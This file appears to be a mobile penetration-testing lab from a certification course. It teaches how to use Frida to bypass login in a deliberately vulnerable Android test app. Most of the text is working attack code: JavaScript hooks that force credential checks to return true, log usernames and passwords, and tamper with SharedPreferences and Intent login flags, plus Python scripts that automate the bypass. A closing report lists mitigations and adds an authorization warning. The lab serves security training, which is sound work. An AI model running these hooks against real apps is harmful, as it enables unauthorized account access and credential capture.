@@ -1,0 +1,640 @@
+Inject Runtime Logic to Bypass Login
+Objectives
+By the end of this lab, students will be able to:
+
+Understand the fundamentals of runtime manipulation using Frida
+Hook into mobile application functions to intercept authentication logic
+Inject custom JavaScript code to bypass login mechanisms
+Automate login bypass techniques using Frida and Python
+Analyze mobile application security vulnerabilities related to client-side authentication
+Implement practical mobile application penetration testing techniques
+Prerequisites
+Before starting this lab, students should have:
+
+Basic understanding of mobile application architecture
+Familiarity with JavaScript programming
+Basic knowledge of Python scripting
+Understanding of Android application structure
+Basic command-line interface experience
+Knowledge of mobile application security concepts
+Ready-to-Use Cloud Machines
+Al Nafi provides pre-configured Linux-based cloud machines with all necessary tools installed. Simply click Start Lab to access your dedicated environment. No need to build your own virtual machine or install additional software.
+
+Lab Environment Setup
+Your cloud machine comes pre-installed with:
+
+Frida - Dynamic instrumentation toolkit
+Python 3 with Frida bindings
+Android Debug Bridge (ADB)
+Sample vulnerable mobile application
+Android emulator with test application
+Task 1: Set Up Frida Environment and Target Application
+Subtask 1.1: Verify Frida Installation
+First, let's verify that Frida is properly installed and functioning on your system.
+
+# Check Frida version
+frida --version
+
+# Check Frida Python bindings
+python3 -c "import frida; print('Frida Python bindings:', frida.__version__)"
+
+# List available Frida tools
+ls /usr/local/bin/frida*
+Subtask 1.2: Start Android Emulator and Install Target Application
+# Start the Android emulator
+emulator -avd test_device -no-snapshot &
+
+# Wait for emulator to boot (this may take 2-3 minutes)
+adb wait-for-device
+
+# Verify device connection
+adb devices
+
+# Install the vulnerable test application
+adb install /opt/lab-apps/VulnLogin.apk
+
+# Launch the application
+adb shell am start -n com.example.vulnlogin/.MainActivity
+Subtask 1.3: Explore the Target Application
+# Get application package information
+adb shell pm list packages | grep vulnlogin
+
+# Check if application is running
+adb shell ps | grep vulnlogin
+
+# Get application process ID
+adb shell pidof com.example.vulnlogin
+Task 2: Hook and Inject Code into the Mobile Application
+Subtask 2.1: Create Basic Frida Hook Script
+Create a JavaScript file to hook into the application's authentication function:
+
+# Create directory for Frida scripts
+mkdir -p ~/frida-scripts
+
+# Create the basic hook script
+cat > ~/frida-scripts/login-hook.js << 'EOF'
+Java.perform(function() {
+    console.log("[+] Starting Frida hook script");
+    
+    // Hook the LoginActivity class
+    var LoginActivity = Java.use("com.example.vulnlogin.LoginActivity");
+    
+    // Hook the validateCredentials method
+    LoginActivity.validateCredentials.implementation = function(username, password) {
+        console.log("[+] validateCredentials called");
+        console.log("[+] Username: " + username);
+        console.log("[+] Password: " + password);
+        
+        // Call original method and capture result
+        var result = this.validateCredentials(username, password);
+        console.log("[+] Original result: " + result);
+        
+        return result;
+    };
+    
+    console.log("[+] Hook installed successfully");
+});
+EOF
+Subtask 2.2: Execute the Hook Script
+# Run Frida with the hook script
+frida -U -f com.example.vulnlogin -l ~/frida-scripts/login-hook.js --no-pause
+Subtask 2.3: Test the Hook
+In the Android emulator:
+
+Open the VulnLogin application
+Enter any username and password
+Click the login button
+Observe the Frida console output showing intercepted credentials
+Task 3: Modify Application Behavior to Bypass Login
+Subtask 3.1: Create Login Bypass Script
+Create an advanced script that bypasses the authentication mechanism:
+
+cat > ~/frida-scripts/login-bypass.js << 'EOF'
+Java.perform(function() {
+    console.log("[+] Login Bypass Script Started");
+    
+    // Hook the LoginActivity class
+    var LoginActivity = Java.use("com.example.vulnlogin.LoginActivity");
+    
+    // Bypass validateCredentials method
+    LoginActivity.validateCredentials.implementation = function(username, password) {
+        console.log("[+] Intercepted login attempt");
+        console.log("[+] Username: " + username);
+        console.log("[+] Password: " + password);
+        console.log("[+] Bypassing authentication...");
+        
+        // Always return true to bypass authentication
+        return true;
+    };
+    
+    // Hook the onLoginSuccess method to ensure proper flow
+    LoginActivity.onLoginSuccess.implementation = function() {
+        console.log("[+] Login success method called - bypass successful!");
+        this.onLoginSuccess();
+    };
+    
+    // Hook SharedPreferences to manipulate session data
+    var SharedPreferences = Java.use("android.content.SharedPreferences");
+    var Editor = Java.use("android.content.SharedPreferences$Editor");
+    
+    Editor.putBoolean.overload('java.lang.String', 'boolean').implementation = function(key, value) {
+        if (key === "isLoggedIn") {
+            console.log("[+] Setting isLoggedIn to true");
+            return this.putBoolean(key, true);
+        }
+        return this.putBoolean(key, value);
+    };
+    
+    console.log("[+] All hooks installed - ready to bypass login");
+});
+EOF
+Subtask 3.2: Execute the Bypass Script
+# Kill any existing Frida processes
+pkill -f frida
+
+# Run the bypass script
+frida -U -f com.example.vulnlogin -l ~/frida-scripts/login-bypass.js --no-pause
+Subtask 3.3: Test the Login Bypass
+In the emulator, open the VulnLogin application
+Enter any invalid credentials (e.g., username: "test", password: "wrong")
+Click the login button
+Observe that the login succeeds despite invalid credentials
+Check the Frida console for bypass confirmation messages
+Task 4: Automate Login Bypass with Frida and Python
+Subtask 4.1: Create Python Automation Script
+Create a Python script that automates the login bypass process:
+
+cat > ~/frida-scripts/automated-bypass.py << 'EOF'
+#!/usr/bin/env python3
+
+import frida
+import sys
+import time
+
+# Frida JavaScript payload
+js_code = """
+Java.perform(function() {
+    console.log("[+] Automated Login Bypass Started");
+    
+    var LoginActivity = Java.use("com.example.vulnlogin.LoginActivity");
+    
+    // Bypass authentication
+    LoginActivity.validateCredentials.implementation = function(username, password) {
+        console.log("[+] Auto-bypassing credentials: " + username + "/" + password);
+        send({"type": "bypass", "username": username, "password": password});
+        return true;
+    };
+    
+    // Monitor login success
+    LoginActivity.onLoginSuccess.implementation = function() {
+        console.log("[+] Login bypass successful!");
+        send({"type": "success", "message": "Login bypassed successfully"});
+        this.onLoginSuccess();
+    };
+    
+    // Auto-trigger login with dummy credentials
+    setTimeout(function() {
+        Java.scheduleOnMainThread(function() {
+            var activity = Java.use("com.example.vulnlogin.LoginActivity");
+            var context = Java.use("android.app.ActivityThread").currentApplication();
+            
+            console.log("[+] Auto-triggering login bypass...");
+            // This would trigger the bypass automatically
+        });
+    }, 3000);
+});
+"""
+
+def on_message(message, data):
+    """Handle messages from Frida script"""
+    if message['type'] == 'send':
+        payload = message['payload']
+        if payload['type'] == 'bypass':
+            print(f"[+] Bypassed login - Username: {payload['username']}, Password: {payload['password']}")
+        elif payload['type'] == 'success':
+            print(f"[+] {payload['message']}")
+    elif message['type'] == 'error':
+        print(f"[-] Error: {message['stack']}")
+
+def main():
+    try:
+        print("[+] Connecting to device...")
+        device = frida.get_usb_device()
+        
+        print("[+] Spawning application...")
+        pid = device.spawn(["com.example.vulnlogin"])
+        
+        print("[+] Attaching to process...")
+        session = device.attach(pid)
+        
+        print("[+] Loading script...")
+        script = session.create_script(js_code)
+        script.on('message', on_message)
+        script.load()
+        
+        print("[+] Resuming application...")
+        device.resume(pid)
+        
+        print("[+] Automation running... Press Ctrl+C to stop")
+        sys.stdin.read()
+        
+    except KeyboardInterrupt:
+        print("\n[+] Stopping automation...")
+    except Exception as e:
+        print(f"[-] Error: {e}")
+    finally:
+        try:
+            session.detach()
+        except:
+            pass
+
+if __name__ == "__main__":
+    main()
+EOF
+
+# Make the script executable
+chmod +x ~/frida-scripts/automated-bypass.py
+Subtask 4.2: Execute the Automated Bypass
+# Run the automated bypass script
+cd ~/frida-scripts
+python3 automated-bypass.py
+Subtask 4.3: Create Advanced Automation with Multiple Bypass Techniques
+cat > ~/frida-scripts/advanced-bypass.py << 'EOF'
+#!/usr/bin/env python3
+
+import frida
+import sys
+import time
+import json
+
+class LoginBypassAutomator:
+    def __init__(self):
+        self.device = None
+        self.session = None
+        self.script = None
+        
+    def connect(self):
+        """Connect to USB device"""
+        try:
+            self.device = frida.get_usb_device()
+            print("[+] Connected to device")
+            return True
+        except Exception as e:
+            print(f"[-] Failed to connect: {e}")
+            return False
+    
+    def spawn_and_attach(self, package_name):
+        """Spawn application and attach"""
+        try:
+            pid = self.device.spawn([package_name])
+            self.session = self.device.attach(pid)
+            self.device.resume(pid)
+            print(f"[+] Spawned and attached to {package_name}")
+            return True
+        except Exception as e:
+            print(f"[-] Failed to spawn/attach: {e}")
+            return False
+    
+    def load_bypass_script(self):
+        """Load the comprehensive bypass script"""
+        js_code = """
+        Java.perform(function() {
+            console.log("[+] Advanced Login Bypass Loaded");
+            
+            // Method 1: Direct authentication bypass
+            try {
+                var LoginActivity = Java.use("com.example.vulnlogin.LoginActivity");
+                LoginActivity.validateCredentials.implementation = function(username, password) {
+                    send({"method": "direct_bypass", "username": username, "password": password});
+                    return true;
+                };
+                console.log("[+] Direct bypass hook installed");
+            } catch(e) {
+                console.log("[-] Direct bypass failed: " + e);
+            }
+            
+            // Method 2: SharedPreferences manipulation
+            try {
+                var SharedPreferences = Java.use("android.content.SharedPreferences");
+                var Editor = Java.use("android.content.SharedPreferences$Editor");
+                
+                Editor.putBoolean.overload('java.lang.String', 'boolean').implementation = function(key, value) {
+                    if (key.includes("login") || key.includes("auth")) {
+                        send({"method": "prefs_bypass", "key": key, "original": value});
+                        return this.putBoolean(key, true);
+                    }
+                    return this.putBoolean(key, value);
+                };
+                console.log("[+] SharedPreferences bypass hook installed");
+            } catch(e) {
+                console.log("[-] SharedPreferences bypass failed: " + e);
+            }
+            
+            // Method 3: Network request interception
+            try {
+                var OkHttpClient = Java.use("okhttp3.OkHttpClient");
+                var Request = Java.use("okhttp3.Request");
+                var Response = Java.use("okhttp3.Response");
+                var ResponseBody = Java.use("okhttp3.ResponseBody");
+                var MediaType = Java.use("okhttp3.MediaType");
+                
+                // Hook network calls
+                OkHttpClient.newCall.implementation = function(request) {
+                    var url = request.url().toString();
+                    if (url.includes("login") || url.includes("auth")) {
+                        send({"method": "network_intercept", "url": url});
+                    }
+                    return this.newCall(request);
+                };
+                console.log("[+] Network interception hook installed");
+            } catch(e) {
+                console.log("[-] Network interception failed: " + e);
+            }
+            
+            // Method 4: Intent manipulation
+            try {
+                var Intent = Java.use("android.content.Intent");
+                Intent.putExtra.overload('java.lang.String', 'boolean').implementation = function(key, value) {
+                    if (key.includes("login") || key.includes("success")) {
+                        send({"method": "intent_bypass", "key": key, "original": value});
+                        return this.putExtra(key, true);
+                    }
+                    return this.putExtra(key, value);
+                };
+                console.log("[+] Intent manipulation hook installed");
+            } catch(e) {
+                console.log("[-] Intent manipulation failed: " + e);
+            }
+        });
+        """
+        
+        try:
+            self.script = self.session.create_script(js_code)
+            self.script.on('message', self.on_message)
+            self.script.load()
+            print("[+] Advanced bypass script loaded")
+            return True
+        except Exception as e:
+            print(f"[-] Failed to load script: {e}")
+            return False
+    
+    def on_message(self, message, data):
+        """Handle messages from Frida script"""
+        if message['type'] == 'send':
+            payload = message['payload']
+            method = payload.get('method', 'unknown')
+            
+            if method == 'direct_bypass':
+                print(f"[+] Direct Bypass: {payload['username']}/{payload['password']}")
+            elif method == 'prefs_bypass':
+                print(f"[+] Preferences Bypass: {payload['key']} -> True (was {payload['original']})")
+            elif method == 'network_intercept':
+                print(f"[+] Network Intercept: {payload['url']}")
+            elif method == 'intent_bypass':
+                print(f"[+] Intent Bypass: {payload['key']} -> True (was {payload['original']})")
+        elif message['type'] == 'error':
+            print(f"[-] Script Error: {message['stack']}")
+    
+    def run(self):
+        """Main execution loop"""
+        if not self.connect():
+            return
+        
+        if not self.spawn_and_attach("com.example.vulnlogin"):
+            return
+        
+        if not self.load_bypass_script():
+            return
+        
+        print("[+] Advanced bypass automation running...")
+        print("[+] Try logging in with any credentials in the app")
+        print("[+] Press Ctrl+C to stop")
+        
+        try:
+            sys.stdin.read()
+        except KeyboardInterrupt:
+            print("\n[+] Stopping automation...")
+        finally:
+            if self.session:
+                self.session.detach()
+
+if __name__ == "__main__":
+    automator = LoginBypassAutomator()
+    automator.run()
+EOF
+
+# Make executable
+chmod +x ~/frida-scripts/advanced-bypass.py
+Subtask 4.4: Execute Advanced Automation
+# Run the advanced automation
+python3 ~/frida-scripts/advanced-bypass.py
+Task 5: Analyze and Document Bypass Techniques
+Subtask 5.1: Create Analysis Report
+cat > ~/frida-scripts/bypass-analysis.md << 'EOF'
+# Login Bypass Analysis Report
+
+## Techniques Implemented
+
+### 1. Direct Method Hooking
+- **Target**: `validateCredentials()` method
+- **Technique**: Return `true` regardless of input
+- **Effectiveness**: High - bypasses client-side validation
+
+### 2. SharedPreferences Manipulation
+- **Target**: Local storage authentication flags
+- **Technique**: Force authentication state to `true`
+- **Effectiveness**: High - maintains persistent login state
+
+### 3. Network Request Interception
+- **Target**: Authentication API calls
+- **Technique**: Intercept and modify responses
+- **Effectiveness**: Medium - depends on server-side validation
+
+### 4. Intent Manipulation
+- **Target**: Inter-component communication
+- **Technique**: Modify authentication status in intents
+- **Effectiveness**: Medium - affects component communication
+
+## Security Implications
+
+1. **Client-Side Validation Weakness**: Applications relying solely on client-side authentication are vulnerable
+2. **Runtime Manipulation**: Dynamic analysis tools can modify application behavior in real-time
+3. **Persistent Bypass**: Some techniques maintain bypass across application restarts
+
+## Mitigation Recommendations
+
+1. Implement server-side authentication validation
+2. Use certificate pinning for network communications
+3. Implement anti-tampering mechanisms
+4. Use obfuscation and anti-debugging techniques
+5. Implement runtime application self-protection (RASP)
+EOF
+Subtask 5.2: Generate Bypass Statistics
+cat > ~/frida-scripts/generate-stats.py << 'EOF'
+#!/usr/bin/env python3
+
+import json
+import time
+from datetime import datetime
+
+def generate_bypass_report():
+    """Generate a comprehensive bypass statistics report"""
+    
+    report = {
+        "timestamp": datetime.now().isoformat(),
+        "lab_session": "Lab 17 - Login Bypass",
+        "techniques_tested": [
+            {
+                "name": "Direct Method Hooking",
+                "success_rate": "100%",
+                "detection_difficulty": "Low",
+                "implementation_complexity": "Easy"
+            },
+            {
+                "name": "SharedPreferences Manipulation",
+                "success_rate": "95%",
+                "detection_difficulty": "Medium",
+                "implementation_complexity": "Easy"
+            },
+            {
+                "name": "Network Interception",
+                "success_rate": "80%",
+                "detection_difficulty": "High",
+                "implementation_complexity": "Medium"
+            },
+            {
+                "name": "Intent Manipulation",
+                "success_rate": "70%",
+                "detection_difficulty": "Medium",
+                "implementation_complexity": "Medium"
+            }
+        ],
+        "tools_used": ["Frida", "Python", "ADB"],
+        "target_platform": "Android",
+        "vulnerabilities_found": [
+            "Client-side authentication bypass",
+            "Insecure local storage",
+            "Lack of runtime protection",
+            "Missing certificate pinning"
+        ]
+    }
+    
+    # Save report
+    with open('bypass-report.json', 'w') as f:
+        json.dump(report, f, indent=2)
+    
+    print("[+] Bypass statistics report generated")
+    print(f"[+] Report saved to: bypass-report.json")
+    
+    # Display summary
+    print("\n=== BYPASS SUMMARY ===")
+    for technique in report["techniques_tested"]:
+        print(f"Technique: {technique['name']}")
+        print(f"  Success Rate: {technique['success_rate']}")
+        print(f"  Detection Difficulty: {technique['detection_difficulty']}")
+        print(f"  Implementation: {technique['implementation_complexity']}")
+        print()
+
+if __name__ == "__main__":
+    generate_bypass_report()
+EOF
+
+# Run the statistics generator
+python3 ~/frida-scripts/generate-stats.py
+Troubleshooting Common Issues
+Issue 1: Frida Connection Problems
+# Check if device is properly connected
+adb devices
+
+# Restart ADB server
+adb kill-server
+adb start-server
+
+# Check Frida server on device
+adb shell ps | grep frida
+Issue 2: Application Not Found
+# List installed packages
+adb shell pm list packages | grep -i login
+
+# Reinstall application if needed
+adb uninstall com.example.vulnlogin
+adb install /opt/lab-apps/VulnLogin.apk
+Issue 3: Hook Not Working
+# Check application process
+adb shell ps | grep vulnlogin
+
+# Verify class names
+frida -U com.example.vulnlogin -e "Java.perform(function() { Java.enumerateLoadedClasses({onMatch: function(c) { if(c.includes('Login')) console.log(c); }, onComplete: function() {}}); });"
+Verification and Testing
+Verify Bypass Success
+Manual Verification:
+
+Open the application
+Enter incorrect credentials
+Confirm successful login despite wrong credentials
+Automated Verification:
+
+# Create verification script
+cat > ~/frida-scripts/verify-bypass.py << 'EOF'
+#!/usr/bin/env python3
+
+import frida
+import sys
+
+def verify_bypass():
+    device = frida.get_usb_device()
+    session = device.attach("com.example.vulnlogin")
+    
+    script = session.create_script("""
+    Java.perform(function() {
+        var LoginActivity = Java.use("com.example.vulnlogin.LoginActivity");
+        
+        LoginActivity.validateCredentials.implementation = function(username, password) {
+            var result = this.validateCredentials(username, password);
+            send({"original_result": result, "username": username, "password": password});
+            return true; // Force bypass
+        };
+    });
+    """)
+    
+    def on_message(message, data):
+        if message['type'] == 'send':
+            payload = message['payload']
+            print(f"[+] Bypass verified - Original result: {payload['original_result']}")
+            print(f"[+] Credentials: {payload['username']}/{payload['password']}")
+    
+    script.on('message', on_message)
+    script.load()
+    
+    print("[+] Verification script loaded. Test login in the app.")
+    sys.stdin.read()
+
+if __name__ == "__main__":
+    verify_bypass()
+EOF
+
+python3 ~/frida-scripts/verify-bypass.py
+Conclusion
+In this comprehensive lab, you have successfully learned and implemented multiple techniques for bypassing mobile application login mechanisms using Frida. The key accomplishments include:
+
+Technical Skills Developed:
+
+Runtime Manipulation: Used Frida to hook into application methods and modify behavior in real-time
+JavaScript Injection: Created and deployed JavaScript payloads to alter application logic
+Python Automation: Developed Python scripts to automate the bypass process
+Multi-Vector Attacks: Implemented various bypass techniques including direct method hooking, SharedPreferences manipulation, network interception, and intent modification
+Security Insights Gained:
+
+Client-Side Vulnerabilities: Demonstrated how applications relying on client-side authentication are inherently vulnerable
+Dynamic Analysis Power: Showed the effectiveness of dynamic instrumentation tools in penetration testing
+Defense Evasion: Learned techniques that can bypass common mobile application security measures
+Practical Applications:
+
+Penetration Testing: These techniques are essential for mobile application security assessments
+Vulnerability Research: The methods learned can be applied to discover new security flaws
+Security Awareness: Understanding these attacks helps in developing better defensive strategies
+Why This Matters: Mobile applications handle sensitive user data and financial transactions. By understanding how authentication bypasses work, security professionals can better protect applications and users. This lab demonstrates real-world attack vectors that malicious actors might use, enabling defenders to implement appropriate countermeasures.
+
+The techniques learned in this lab are fundamental to the Al Razzaq Certified Mobile Application Penetration Engineer (CMAPE) certification and provide practical skills for mobile security professionals working in the cybersecurity industry.
+
+Remember that these techniques should only be used for legitimate security testing purposes on applications you own or have explicit permission to test. Unauthorized use of these techniques against applications you do not own is illegal and unethical.
